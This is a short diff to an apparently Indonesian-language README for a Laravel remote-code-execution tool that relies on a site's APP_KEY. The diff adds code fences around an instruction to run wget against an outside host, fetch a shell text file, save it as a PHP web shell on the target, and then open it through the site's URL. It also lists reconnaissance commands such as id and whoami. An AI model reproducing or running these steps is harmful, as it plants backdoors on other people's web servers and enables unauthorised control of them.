@@ -12,9 +12,9 @@ Web Nya Harus Memiliki APP_KEY , BIAR BISA EKSEKUSI RCE NYA
 Basic Command : ls , id , whoami , uname -a , wget
 
 ### Laravel RCE Reserve Shell
-
+```
 Command : wget http://dyan6etar.cf/shell.txt -O NamaShellNya.php (Enter)
-
+```
 Akses : site.com/NamaShellNya.php
 
 
